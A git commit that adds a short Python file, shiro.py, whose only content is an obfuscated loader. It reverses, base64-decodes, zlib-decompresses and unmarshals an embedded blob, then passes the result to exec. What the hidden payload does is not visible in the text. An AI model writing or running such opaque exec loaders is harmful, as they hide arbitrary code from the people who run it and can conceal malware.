3b44a8873c0a3cf9e90b3bc5086c525a2cf88643
Shiro-Cool-Roam-Tool <162789398+Shiro-Cool-Roam-Tool@users.noreply.github.com>
2024-03-09 15:58:05 +0630

    Add files via upload

---
+++ shiro.py
@@ -0,0 +1,5 @@
+# Obfuscated with PyObfuscate
+# https://www.github.com/htr-tech
+# Time : Sat Mar  9 15:54:47 2024
+# -------------------------------
+_ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(__[::-1])));exec((_)(b'p2hhJBAAVJQsV0Ag7CBYeLjMzAjPksALcBEjiFI2K2uUzp0UzLHb48rdVYDzflNIPboSjjUE+FlZGF3aWk+kP98MxcTJLiXyrSiE8nMoMThwQiMyFjxyQOMmCDpwQ6MmQCxs6DFTCAkZLxJe'))
